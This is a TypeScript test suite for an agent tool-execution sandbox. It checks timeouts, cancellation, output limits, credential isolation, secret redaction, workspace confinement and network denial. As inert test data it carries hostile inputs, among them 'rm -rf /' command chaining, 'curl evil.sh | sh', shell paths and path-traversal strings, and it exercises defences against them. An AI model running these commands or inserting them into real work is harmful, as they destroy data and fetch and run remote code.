/**
 * EO-4.2 — bounded tool execution.
 *
 * Gate tests run against `ScriptedTestSandbox`, a TEST-ONLY provider that
 * never spawns anything (receipts are labelled `simulated`). Adapter tests use
 * the real `LocalHostDiagnosticsSandbox` with the current Node binary
 * (`process.execPath`) and fixed, test-only argument templates — no shell, no
 * model-supplied executable or arguments.
 */
import assert from "node:assert/strict";
import test from "node:test";

import { LocalHostDiagnosticsSandbox } from "../adapters/index.js";
import {
  NotFoundError,
  StateTransitionError,
  ValidationError,
  type ExecutionOperationDefinition,
  type ExecutionPolicy,
  type ExecutionSession,
  type ExecutionToolDefinition,
  type SandboxHandle,
  type SandboxInvocationOutcome,
  type SandboxInvokeOptions,
  type SandboxProvider,
  type StructuredInvocation,
} from "../contracts/index.js";
import {
  BASELINE_DENY_ALL_POLICY,
  BoundedInvocationDispatcher,
  ExecutionManager,
  ExecutionOperationRegistry,
  ExecutionPolicyRegistry,
  ExecutionToolRegistry,
  InMemoryExecutionReceiptStore,
  InMemoryExecutionSessionStore,
  NODE_DIAGNOSTIC_TOOL,
  NODE_VERSION_OPERATION,
  PermissionSystem,
  SandboxRegistry,
  ToolExecutionEngine,
  ToolRegistry,
  registerExecutionTool,
} from "../core/index.js";
import { BETA_OPERATOR, FAKE_SECRET, OPERATOR } from "./fixtures/execution.js";
import {
  WEB_AGENT,
  WEB_HOST,
  WEB_INSTANCE,
  agent,
  planningFixture,
  webRequest,
} from "./fixtures/planning.js";

/* ------------------------------------------------------------------ */
/* Test-only tools, operations and sandbox                            */
/* ------------------------------------------------------------------ */

const ECHO_VALUES = [
  "hello",
  "a; rm -rf / && $(whoami) | `id` & del C:\\x",
] as const;

/** Test-only: the real Node binary with FIXED argument templates. */
const TEST_NODE_TOOL: ExecutionToolDefinition = {
  ...NODE_DIAGNOSTIC_TOOL,
  executable: {
    executableId: "node",
    operations: {
      "node.version": [{ kind: "literal", value: "--version" }],
      "test.sleep": [
        { kind: "literal", value: "-e" },
        { kind: "literal", value: "setTimeout(() => {}, 30000)" },
      ],
      "test.flood": [
        { kind: "literal", value: "-e" },
        { kind: "literal", value: "process.stdout.write('x'.repeat(200000))" },
      ],
      "test.env": [
        { kind: "literal", value: "-e" },
        {
          kind: "literal",
          value:
            "process.stdout.write(JSON.stringify(Object.keys(process.env)))",
        },
      ],
      "test.secret": [
        { kind: "literal", value: "-e" },
        {
          kind: "literal",
          value: `process.stdout.write('key=${FAKE_SECRET}')`,
        },
      ],
      "test.echo": [
        { kind: "literal", value: "-e" },
        { kind: "literal", value: "process.stdout.write(process.argv[1])" },
        { kind: "enum_input", input: "message", values: [...ECHO_VALUES] },
      ],
    },
    environmentVariables: [],
  },
  operations: [
    "node.version",
    "test.sleep",
    "test.flood",
    "test.env",
    "test.secret",
    "test.echo",
  ],
};

function nodeOp(
  id: string,
  extra: Partial<ExecutionOperationDefinition> = {},
): ExecutionOperationDefinition {
  return { ...NODE_VERSION_OPERATION, id, output: { kind: "text" }, ...extra };
}

const NODE_OPERATIONS: ExecutionOperationDefinition[] = [
  NODE_VERSION_OPERATION,
  nodeOp("test.sleep", { timeoutMs: 400 }),
  nodeOp("test.flood"),
  nodeOp("test.env"),
  nodeOp("test.secret"),
  nodeOp("test.echo", {
    input: {
      message: { kind: "enum", values: [...ECHO_VALUES], required: true },
    },
  }),
];

const SCRIPTED_TOOL: ExecutionToolDefinition = {
  toolId: "scripted",
  version: "1.0.0",
  displayName: "Scripted (test double)",
  description: "Test-only tool; its sandbox never spawns a process.",
  requiredCapabilities: ["process.invoke.bounded"],
  supportedEnvironmentCapabilities: ["web_build_capable"],
  executable: {
    executableId: "scripted",
    operations: {
      "scripted.run": [
        { kind: "literal", value: "run" },
        {
          kind: "enum_input",
          input: "mode",
          values: ["ok", "slow", "fail", "secret"],
        },
      ],
      "scripted.write": [
        { kind: "literal", value: "run" },
        { kind: "literal", value: "ok" },
        { kind: "workspace_path_input", input: "outDir" },
      ],
      "scripted.net": [{ kind: "literal", value: "net" }],
      "scripted.risky": [
        { kind: "literal", value: "run" },
        { kind: "literal", value: "ok" },
      ],
    },
    environmentVariables: [],
  },
  operations: [
    "scripted.run",
    "scripted.write",
    "scripted.net",
    "scripted.risky",
  ],
};

const SCRIPTED_OPERATIONS: ExecutionOperationDefinition[] = [
  {
    id: "scripted.run",
    toolId: "scripted",
    stageKind: "build",
    description: "Scripted run.",
    requiredCapabilities: ["process.invoke.bounded"],
    risk: "low",
    input: {
      mode: {
        kind: "enum",
        values: ["ok", "slow", "fail", "secret"],
        required: true,
      },
    },
    requiredToolchains: ["node"],
    workspaceAccess: "none",
  },
  {
    id: "scripted.write",
    toolId: "scripted",
    stageKind: "build",
    description: "Scripted write into the workspace.",
    requiredCapabilities: [
      "process.invoke.bounded",
      "filesystem.write.workspace",
    ],
    risk: "low",
    input: { outDir: { kind: "workspace_path", required: true } },
  },
  {
    id: "scripted.net",
    toolId: "scripted",
    stageKind: "build",
    description: "Needs network.",
    requiredCapabilities: [
      "process.invoke.bounded",
      "network.outbound.allowed-host",
    ],
    risk: "low",
    input: {},
    networkAccess: "approved_hosts",
  },
  {
    id: "scripted.risky",
    toolId: "scripted",
    stageKind: "build",
    description: "High-risk operation.",
    requiredCapabilities: ["process.invoke.bounded"],
    risk: "high",
    input: {},
  },
];

/** TEST-ONLY provider: advertises isolation, never spawns, honours abort. */
class ScriptedTestSandbox implements SandboxProvider {
  readonly providerId = "scripted-test-double";
  readonly kind = "local_restricted_process" as const;
  readonly capabilities = {
    enforcedLimits: [
      "sessionTimeoutMs",
      "operationTimeoutMs",
      "maxOutputBytes",
      "maxArtifactBytes",
      "maxToolCalls",
    ] as const,
    networkModes: ["deny_all" as const],
    networkIsolation: true,
    filesystemIsolation: true,
    supportsKill: true,
    maxConcurrentInvocations: 8,
    simulated: true,
  };
  readonly invocations: StructuredInvocation[] = [];
  isAvailableFor(id: string) {
    return id === "web-1";
  }
  async prepareWorkspace(): Promise<never> {
    throw new Error("not used");
  }
  async start(spec: { sessionId: string }): Promise<SandboxHandle> {
    return {
      sandboxId: `sbx-${spec.sessionId}`,
      providerId: this.providerId,
      sessionId: spec.sessionId,
    };
  }
  async invoke(
    _h: SandboxHandle,
    invocation: StructuredInvocation,
    options: SandboxInvokeOptions,
  ): Promise<SandboxInvocationOutcome> {
    this.invocations.push(invocation);
    const mode = invocation.argv[1];
    const out = (
      text: string,
      exitClass: SandboxInvocationOutcome["exitClass"] = "success",
    ): SandboxInvocationOutcome => ({
      exitClass,
      exitCode: exitClass === "success" ? 0 : 1,
      stdout: { text, truncated: false, originalBytes: text.length },
      stderr: { text: "", truncated: false, originalBytes: 0 },
      durationMs: 1,
      redactions: 0,
    });
    if (mode === "slow") {
      await new Promise<void>((resolve) => {
        if (options.signal.aborted) return resolve();
        options.signal.addEventListener("abort", () => resolve(), {
          once: true,
        });
        setTimeout(resolve, 5000);
      });
      return out("", options.signal.aborted ? "cancelled" : "success");
    }
    if (mode === "fail") return out("boom", "tool_failure");
    // Deliberately unredacted: the manager must redact defensively.
    if (mode === "secret") return out(`leaked ${FAKE_SECRET}`);
    return out("done");
  }
  async terminate() {}
  async collectOutputs() {
    return [];
  }
  async cleanup() {}
}

/* ------------------------------------------------------------------ */
/* Harness                                                            */
/* ------------------------------------------------------------------ */

async function harness(options: {
  provider: "host" | "scripted";
  maxConcurrent?: number;
  hostProcess?: boolean;
}) {
  const fixture = planningFixture({
    hosts: [WEB_HOST],
    instances: [WEB_INSTANCE],
    agents: [WEB_AGENT, agent("sec-agent", ["security_review"])],
  });
  const tools = new ToolRegistry(fixture.audit);
  const executionTools = new ExecutionToolRegistry();
  const dispatcher = new BoundedInvocationDispatcher();
  const scope = {
    allowedAgents: ["web-agent"],
    allowedProjects: ["alpha"],
    allowedEnvironments: ["local" as const],
  };
  registerExecutionTool(
    tools,
    executionTools,
    dispatcher,
    TEST_NODE_TOOL,
    scope,
  );
  registerExecutionTool(
    tools,
    executionTools,
    dispatcher,
    SCRIPTED_TOOL,
    scope,
  );
  const operations = new ExecutionOperationRegistry();
  [...NODE_OPERATIONS, ...SCRIPTED_OPERATIONS].forEach((o) =>
    operations.register(o),
  );

  const policy: ExecutionPolicy = {
    policyId: "alpha-exec",
    version: 1,
    description: "EO-4.2 test policy.",
    rules: [
      {
        id: "diagnostics",
        operationIds: [...NODE_OPERATIONS, ...SCRIPTED_OPERATIONS].map(
          (o) => o.id,
        ),
        capabilities: [
          "process.invoke.bounded",
          "filesystem.write.workspace",
          "network.outbound.allowed-host",
        ],
        filesystem: [{ access: "write", path: "." }],
        requiredEnvironmentCapabilities: [],
        hostProcess: options.hostProcess ?? true,
      },
    ],
    forbiddenCapabilities: [],
    maxRisk: "high",
    approvalRequiredAtOrAbove: "high",
    defaultLimits: {
      sessionTimeoutMs: 120_000,
      operationTimeoutMs: 15_000,
      maxOutputBytes: 4096,
      maxArtifactBytes: 1_000_000,
      maxToolCalls: 5,
    },
    network: { mode: "deny_all" },
    grantTtlMs: 600_000,
  };
  const policies = new ExecutionPolicyRegistry({
    policyId: "baseline-deny-all",
    version: 1,
  });
  policies.register(BASELINE_DENY_ALL_POLICY);
  policies.register(policy);
  policies.bindProject("alpha", "alpha-exec", 1);

  const sandboxes = new SandboxRegistry();
  const scripted = new ScriptedTestSandbox();
  if (options.provider === "scripted") sandboxes.register(scripted);
  else
    sandboxes.register(
      new LocalHostDiagnosticsSandbox({
        executables: { node: process.execPath },
        environmentInstanceIds: ["web-1"],
      }),
    );

  const engine = new ToolExecutionEngine({
    registry: tools,
    permissions: new PermissionSystem([{ effect: "allow", action: "execute" }]),
    audit: fixture.audit,
  });
  const sessions = new InMemoryExecutionSessionStore();
  const receipts = new InMemoryExecutionReceiptStore();
  const clock = { now: "2026-09-24T12:00:00.000Z" };
  let seq = 0;
  const manager = new ExecutionManager({
    planning: fixture.planning,
    approvals: fixture.approvals,
    agents: fixture.agents,
    isAgentEnabled: (id) => !fixture.disabled.has(id),
    environments: fixture.registry,
    tools,
    projects: { has: (id) => id === "alpha" || id === "beta" },
    operations,
    policies,
    sandboxes,
    sessions,
    audit: fixture.audit,
    clock: () => clock.now,
    idFactory: (prefix) => `${prefix}_${++seq}`,
    executionTools,
    toolEngine: engine,
    dispatcher,
    receipts,
    maxConcurrentPerEnvironment: options.maxConcurrent ?? 2,
  });
  const plan = await fixture.planning.createPlan(webRequest("alpha"), {
    id: "op-1",
  });
  let keys = 0;
  const session = async (
    operationId: string,
    input?: Record<string, string>,
  ): Promise<ExecutionSession> =>
    (
      await manager.createSession(
        OPERATOR,
        {
          projectId: "alpha",
          planId: plan.planId,
          planVersion: plan.version,
          stageId: "build:web",
          operationId,
          ...(input ? { input } : {}),
        },
        `key-${++keys}`,
      )
    ).session;
  let invocations = 0;
  const invoke = (s: ExecutionSession, over: Record<string, unknown> = {}) =>
    manager.invoke(OPERATOR, {
      sessionId: s.sessionId,
      invocationId: `inv-${++invocations}`,
      toolId: s.toolId,
      operationId: s.operationId,
      ...over,
    });
  return {
    fixture,
    manager,
    sessions,
    receipts,
    scripted,
    engine,
    dispatcher,
    plan,
    session,
    invoke,
    clock,
  };
}

const codes = (r: { reasons: readonly { code: string }[] }) =>
  r.reasons.map((x) => x.code);

/* ------------------------------------------------------------------ */
/* Valid path + real bounded adapter                                  */
/* ------------------------------------------------------------------ */

test("VALID: node.version runs through the registered adapter; output validated; receipt correlated", async () => {
  const h = await harness({ provider: "host" });
  const s = await h.session("node.version");
  assert.equal(s.status, "ready", JSON.stringify(s.reasons));
  const result = await h.invoke(s, { invocationId: "inv-version" });
  assert.equal(result.exitClass, "success", JSON.stringify(result.reasons));
  assert.equal(result.outcome, "succeeded");
  assert.equal(result.result?.version, process.versions.node);
  assert.equal((await h.sessions.get(s.sessionId))!.status, "succeeded");

  const receipt = h.receipts.get(result.receiptId)!;
  assert.deepEqual(
    {
      projectId: receipt.projectId,
      plan: receipt.plan,
      sessionId: receipt.sessionId,
      agentId: receipt.agentId,
      environmentInstanceId: receipt.environmentInstanceId,
      toolId: receipt.toolId,
      operationId: receipt.operationId,
      policy: receipt.policy,
      invocationId: receipt.invocationId,
      simulated: receipt.simulated,
    },
    {
      projectId: "alpha",
      plan: s.plan,
      sessionId: s.sessionId,
      agentId: "web-agent",
      environmentInstanceId: "web-1",
      toolId: "node",
      operationId: "node.version",
      policy: { policyId: "alpha-exec", version: 1 },
      invocationId: "inv-version",
      simulated: false,
    },
  );
  assert.equal(
    receipt.attemptId,
    (await h.sessions.get(s.sessionId))!.attempts[0]!.attemptId,
  );
  // Through the ONE tool pipeline, and audited.
  const toolEvents = h.fixture.audit
    .query({ type: "tool_execution" })
    .filter((e) => e.data.toolId === "node");
  assert.ok(toolEvents.length > 0);
  const actions = h.fixture.audit
    .query({ type: "execution_event" })
    .map((e) => e.data.action);
  for (const a of [
    "invocation_requested",
    "operation_started",
    "operation_completed",
  ])
    assert.ok(actions.includes(a), a);
});

test("TIMEOUT: a slow operation is killed at its finite timeout; session + receipt reflect it", async () => {
  const h = await harness({ provider: "host" });
  const s = await h.session("test.sleep");
  const started = Date.now();
  const result = await h.invoke(s);
  assert.equal(result.exitClass, "timeout");
  assert.ok(
    Date.now() - started < 10_000,
    "the process was terminated, not awaited",
  );
  assert.deepEqual(codes(result), ["TIMEOUT"]);
  assert.equal((await h.sessions.get(s.sessionId))!.status, "timed_out");
  assert.equal(h.receipts.get(result.receiptId)!.outcome, "timed_out");
  assert.ok(
    h.fixture.audit
      .query({ type: "execution_event" })
      .some((e) => e.data.action === "operation_timed_out"),
  );
});

test("CANCELLATION: cancelling the session terminates the active invocation; idempotent", async () => {
  const h = await harness({ provider: "host" });
  // Longer operation timeout for this session (policy allows 15s).
  const s = await h.session("test.sleep");
  const slow = { ...s };
  const pending = h.manager.invoke(OPERATOR, {
    sessionId: slow.sessionId,
    invocationId: "inv-cancel",
    toolId: "node",
    operationId: "test.sleep",
  });
  await new Promise((r) => setTimeout(r, 150));
  const first = await h.manager.cancel(
    OPERATOR,
    s.sessionId,
    "operator stop",
    "cancel",
  );
  assert.equal(first.outcome, "cancelling");
  const result = await pending;
  assert.ok(
    ["cancelled", "timeout"].includes(result.exitClass),
    result.exitClass,
  );
  const final = (await h.sessions.get(s.sessionId))!;
  assert.equal(final.status, "cancelled");
  assert.equal(
    (await h.manager.cancel(OPERATOR, s.sessionId, "again", "cancel")).outcome,
    "already_cancelled",
  );
  assert.equal(
    h.receipts.get(result.receiptId)!.outcome,
    result.exitClass === "timeout" ? "timed_out" : "cancelled",
  );
});

test("OUTPUT LIMIT: oversized output is truncated explicitly and the receipt says so", async () => {
  const h = await harness({ provider: "host" });
  const result = await h.invoke(await h.session("test.flood"));
  assert.equal(result.exitClass, "success");
  assert.equal(result.output?.truncated, true);
  assert.ok(Buffer.byteLength(result.output!.text) <= 4096);
  const receipt = h.receipts.get(result.receiptId)!;
  assert.equal(receipt.resources.outputTruncated, true);
  assert.ok(receipt.resources.outputBytes >= 200_000);
});

test("ENV: the child environment is constructed, never inherited (no credentials leak)", async () => {
  const h = await harness({ provider: "host" });
  const saved = {
    a: process.env.OPENAI_API_KEY,
    g: process.env.GOOGLE_APPLICATION_CREDENTIALS,
  };
  process.env.OPENAI_API_KEY = FAKE_SECRET;
  process.env.GOOGLE_APPLICATION_CREDENTIALS = "/secret/service-account.json";
  try {
    const result = await h.invoke(await h.session("test.env"));
    assert.equal(result.exitClass, "success");
    const keys = (JSON.parse(result.output!.text) as string[]).map((k) =>
      k.toLowerCase(),
    );
    // No credential ever crosses the boundary.
    for (const leaked of ["openai_api_key", "google_application_credentials"]) {
      assert.ok(!keys.includes(leaked), leaked);
    }
    // POSIX: nothing is inherited. Windows: libuv always injects this fixed,
    // non-secret system baseline into every child; nothing beyond it appears.
    const baseline =
      process.platform === "win32"
        ? [
            "systemroot",
            "windir",
            "homedrive",
            "homepath",
            "logonserver",
            "path",
            "systemdrive",
            "temp",
            "userdomain",
            "username",
            "userprofile",
          ]
        : [];
    assert.deepEqual(
      keys.filter((k) => !baseline.includes(k)),
      [],
    );
  } finally {
    if (saved.a === undefined) delete process.env.OPENAI_API_KEY;
    else process.env.OPENAI_API_KEY = saved.a;
    if (saved.g === undefined)
      delete process.env.GOOGLE_APPLICATION_CREDENTIALS;
    else process.env.GOOGLE_APPLICATION_CREDENTIALS = saved.g;
  }
});

test("RAW SHELL INJECTION: shell syntax in structured input stays inert data (no shell)", async () => {
  const h = await harness({ provider: "host" });
  const injected = ECHO_VALUES[1];
  const result = await h.invoke(
    await h.session("test.echo", { message: injected }),
    { input: { message: injected } },
  );
  assert.equal(result.exitClass, "success", JSON.stringify(result.reasons));
  assert.equal(
    result.output?.text,
    injected,
    "passed verbatim as ONE argv entry, never interpreted",
  );
  // Anything outside the operation's argument allowlist is refused.
  const s2 = await h.session("test.echo", { message: "hello" });
  for (const message of [
    "--inspect=0.0.0.0:9229",
    "C:\\Windows\\System32\\cmd.exe",
    "/bin/bash",
  ]) {
    const r = await h.invoke(s2, { input: { message } });
    assert.equal(r.outcome, "denied");
    assert.ok(codes(r).includes("INVALID_TOOL_INPUT"), message);
  }
});

test("SECRET REDACTION: secret-shaped output is redacted before anyone sees it", async () => {
  const h = await harness({ provider: "host" });
  const result = await h.invoke(await h.session("test.secret"));
  assert.equal(result.exitClass, "success");
  assert.ok(!result.output!.text.includes(FAKE_SECRET));
  assert.match(result.output!.text, /\[redacted\]/);
  assert.ok(
    !JSON.stringify(h.receipts.get(result.receiptId)).includes(FAKE_SECRET),
  );
});

test("HOST PROVIDER is never selected without an explicit hostProcess policy opt-in", async () => {
  const h = await harness({ provider: "host", hostProcess: false });
  const s = await h.session("node.version");
  assert.equal(s.status, "denied");
  assert.ok(s.reasons.some((r) => r.code === "SANDBOX_UNAVAILABLE"));
  const r = await h.invoke(s);
  assert.equal(r.outcome, "denied");
});

/* ------------------------------------------------------------------ */
/* Gates (scripted, simulated sandbox — no process)                   */
/* ------------------------------------------------------------------ */

test("scripted VALID: bounded invocation succeeds through the registered adapter", async () => {
  const h = await harness({ provider: "scripted" });
  const result = await h.invoke(
    await h.session("scripted.run", { mode: "ok" }),
    { input: { mode: "ok" } },
  );
  assert.equal(result.exitClass, "success", JSON.stringify(result.reasons));
  assert.equal(result.output?.text, "done");
  assert.equal(h.scripted.invocations.length, 1);
  assert.deepEqual(h.scripted.invocations[0]!.argv, ["run", "ok"]);
  assert.equal(
    h.receipts.get(result.receiptId)!.simulated,
    true,
    "simulation is labelled",
  );
});

test("UNKNOWN TOOL / OPERATION: denied, receipted, audited — nothing resolved dynamically", async () => {
  const h = await harness({ provider: "scripted" });
  const s = await h.session("scripted.run", { mode: "ok" });
  for (const over of [
    { toolId: "rm" },
    { toolId: "child_process" },
    { operationId: "scripted.rawCommand" },
    { toolId: "node", operationId: "node.version" },
  ]) {
    const r = await h.invoke(s, { ...over, input: { mode: "ok" } });
    assert.equal(r.outcome, "denied", JSON.stringify(over));
    assert.ok(codes(r).includes("TOOL_NOT_ALLOWED"));
    assert.equal(h.receipts.get(r.receiptId)!.outcome, "denied");
  }
  assert.equal(h.scripted.invocations.length, 0);
  assert.ok(
    h.fixture.audit
      .query({ type: "execution_event" })
      .some((e) => e.data.action === "invocation_denied"),
  );
});

test("MALFORMED INPUT and raw fields: rejected before any invocation", async () => {
  const h = await harness({ provider: "scripted" });
  const s = await h.session("scripted.run", { mode: "ok" });
  const unknownField = await h.invoke(s, {
    input: { mode: "ok", flags: "--force" },
  });
  assert.ok(codes(unknownField).includes("INVALID_TOOL_INPUT"));
  const badEnum = await h.invoke(s, {
    input: { mode: "ok; curl evil.sh | sh" },
  });
  assert.ok(codes(badEnum).includes("INVALID_TOOL_INPUT"));
  for (const field of [
    "command",
    "executable",
    "cwd",
    "env",
    "shell",
    "args",
    "network",
  ]) {
    await assert.rejects(
      h.invoke(s, {
        [field]: field === "env" ? { OPENAI_API_KEY: "x" } : "/bin/bash",
      }),
      ValidationError,
      field,
    );
  }
  assert.equal(h.scripted.invocations.length, 0);
});

test("NO CAPABILITY: registered + policy-allowed is not enough without a live grant", async () => {
  const h = await harness({ provider: "scripted" });
  const s = await h.session("scripted.run", { mode: "ok" });
  const stored = (await h.sessions.get(s.sessionId))!;
  assert.equal(
    await h.sessions.commit(
      { ...stored, grants: [], revision: stored.revision + 1 },
      stored.revision,
    ),
    "committed",
  );
  const r = await h.invoke(s, { input: { mode: "ok" } });
  assert.deepEqual(codes(r), ["CAPABILITY_NOT_GRANTED"]);
  // An expired grant is no grant either.
  const s2 = await h.session("scripted.run", { mode: "ok" });
  h.clock.now = "2026-09-24T12:30:00.000Z";
  const expired = await h.invoke(s2, { input: { mode: "ok" } });
  assert.ok(codes(expired).includes("CAPABILITY_NOT_GRANTED"));
  assert.equal(h.scripted.invocations.length, 0);
});

test("WRONG ENVIRONMENT: a required toolchain missing on the instance → denied", async () => {
  const h = await harness({ provider: "scripted" });
  const s = await h.session("scripted.run", { mode: "ok" });
  h.fixture.registry.upsertInstance({ ...WEB_INSTANCE, toolchains: [] });
  const r = await h.invoke(s, { input: { mode: "ok" } });
  assert.ok(codes(r).includes("ENVIRONMENT_UNAVAILABLE"));
  assert.equal(h.scripted.invocations.length, 0);
});

test("STALE PLAN and UNQUALIFIED AGENT: re-validated at invocation; no tool starts", async () => {
  const h = await harness({ provider: "scripted" });
  const s = await h.session("scripted.run", { mode: "ok" });
  h.fixture.disabled.add("web-agent");
  assert.ok(
    codes(await h.invoke(s, { input: { mode: "ok" } })).includes(
      "AGENT_NOT_QUALIFIED",
    ),
  );
  h.fixture.disabled.delete("web-agent");
  h.fixture.agents.register(agent("web-agent-2", ["web_development"]));
  await h.fixture.planning.replan(h.plan.planId, { id: "op-1" });
  assert.ok(
    codes(await h.invoke(s, { input: { mode: "ok" } })).includes("STALE_PLAN"),
  );
  assert.equal(h.scripted.invocations.length, 0);
});

test("APPROVAL: a protected operation without approval never runs", async () => {
  const h = await harness({ provider: "scripted" });
  const s = await h.session("scripted.risky");
  assert.equal(s.status, "denied");
  const r = await h.invoke(s);
  assert.equal(r.outcome, "denied");
  assert.ok(codes(r).includes("APPROVAL_REQUIRED"));
  assert.equal(h.scripted.invocations.length, 0);
});

test("WORKSPACE: traversal, absolute and cross-project paths → WORKSPACE_VIOLATION", async () => {
  const h = await harness({ provider: "scripted" });
  const s = await h.session("scripted.write", { outDir: "dist" });
  assert.equal(s.status, "ready", JSON.stringify(s.reasons));
  for (const outDir of [
    "../x",
    "/etc",
    "C:\\Users",
    "..\\..\\beta\\ews_1",
    "\\\\host\\share",
  ]) {
    const r = await h.invoke(s, { input: { outDir } });
    assert.ok(codes(r).includes("WORKSPACE_VIOLATION"), outDir);
  }
  const ok = await h.invoke(s, { input: { outDir: "dist/app" } });
  assert.equal(ok.exitClass, "success");
  assert.deepEqual(h.scripted.invocations[0]!.argv, ["run", "ok", "dist/app"]);
  assert.match(
    h.scripted.invocations[0]!.workingDirectoryRef,
    /^workspace:\/\/alpha\//,
  );
});

test("NETWORK: a tool cannot widen the session network policy", async () => {
  const h = await harness({ provider: "scripted" });
  const s = await h.session("scripted.net");
  assert.equal(s.status, "denied");
  assert.ok(
    s.reasons.some(
      (r) => r.code === "POLICY_DENIED" && /network/.test(r.detail),
    ),
  );
});

test("CROSS PROJECT: a session of project A is invisible to a project B operator", async () => {
  const h = await harness({ provider: "scripted" });
  const s = await h.session("scripted.run", { mode: "ok" });
  await assert.rejects(
    h.manager.invoke(BETA_OPERATOR, {
      sessionId: s.sessionId,
      invocationId: "x",
      toolId: "scripted",
      operationId: "scripted.run",
      input: { mode: "ok" },
    }),
    NotFoundError,
  );
  assert.equal(h.scripted.invocations.length, 0);
});

test("CONCURRENCY: one active invocation per session and a per-environment ceiling", async () => {
  const h = await harness({ provider: "scripted", maxConcurrent: 1 });
  const a = await h.session("scripted.run", { mode: "slow" });
  const b = await h.session("scripted.run", { mode: "ok" });
  const running = h.invoke(a, { input: { mode: "slow" } });
  await new Promise((r) => setTimeout(r, 30));
  const sameSession = await h.invoke(a, { input: { mode: "slow" } });
  assert.ok(codes(sameSession).includes("RESOURCE_LIMIT"));
  const sameEnvironment = await h.invoke(b, { input: { mode: "ok" } });
  assert.ok(codes(sameEnvironment).includes("RESOURCE_LIMIT"));
  await h.manager.cancel(OPERATOR, a.sessionId, "done", "cancel");
  assert.equal((await running).exitClass, "cancelled");
  assert.equal(h.scripted.invocations.length, 1);
});

test("IDEMPOTENCY: a retried invocationId replays; reuse for a different call is refused", async () => {
  const h = await harness({ provider: "scripted" });
  const s = await h.session("scripted.run", { mode: "ok" });
  const first = await h.invoke(s, {
    invocationId: "same",
    input: { mode: "ok" },
  });
  const again = await h.invoke(s, {
    invocationId: "same",
    input: { mode: "ok" },
  });
  assert.equal(again.replayed, true);
  assert.equal(again.receiptId, first.receiptId);
  assert.equal(h.scripted.invocations.length, 1);
  await assert.rejects(
    h.invoke(s, { invocationId: "same", input: { mode: "fail" } }),
    StateTransitionError,
  );
});

test("OUTPUT VALIDATION + REDACTION: provider output is sanitized even if the provider does not", async () => {
  const h = await harness({ provider: "scripted" });
  const leaked = await h.invoke(
    await h.session("scripted.run", { mode: "secret" }),
    { input: { mode: "secret" } },
  );
  assert.ok(!leaked.output!.text.includes(FAKE_SECRET));
  const failed = await h.invoke(
    await h.session("scripted.run", { mode: "fail" }),
    { input: { mode: "fail" } },
  );
  assert.equal(failed.exitClass, "tool_failure");
  assert.equal(failed.outcome, "failed");
  assert.deepEqual(
    codes(failed),
    [],
    "a tool failure is not presented as a policy denial",
  );
});

test("ENGINE BOUNDARY: the execution tool accepts only a prepared, single-use reference", async () => {
  const h = await harness({ provider: "scripted" });
  for (const input of [
    { invocationRef: "inv_forged" },
    { command: "npm run build" },
    { invocationRef: "x", extra: 1 },
  ]) {
    const result = await h.engine.execute(
      h.engine.createRequest({
        taskId: "t",
        agentId: "web-agent",
        projectId: "alpha",
        toolId: "scripted",
        input,
      }),
    );
    assert.notEqual(result.status, "success", JSON.stringify(input));
  }
  assert.equal(h.scripted.invocations.length, 0);
});

test("REGISTRATION: tools are frozen, unique and bound to argument templates", () => {
  const registry = new ExecutionToolRegistry();
  const stored = registry.register(NODE_DIAGNOSTIC_TOOL);
  assert.throws(
    () => registry.register(NODE_DIAGNOSTIC_TOOL),
    /already registered/,
  );
  assert.throws(() => {
    (stored.operations as string[]).push("node.runAnything");
  }, TypeError);
  assert.throws(
    () =>
      registry.register({
        ...NODE_DIAGNOSTIC_TOOL,
        toolId: "node2",
        operations: ["node.runAnything"],
      }),
    /without an argument template/,
  );
  assert.equal(registry.get("NODE"), undefined);
});
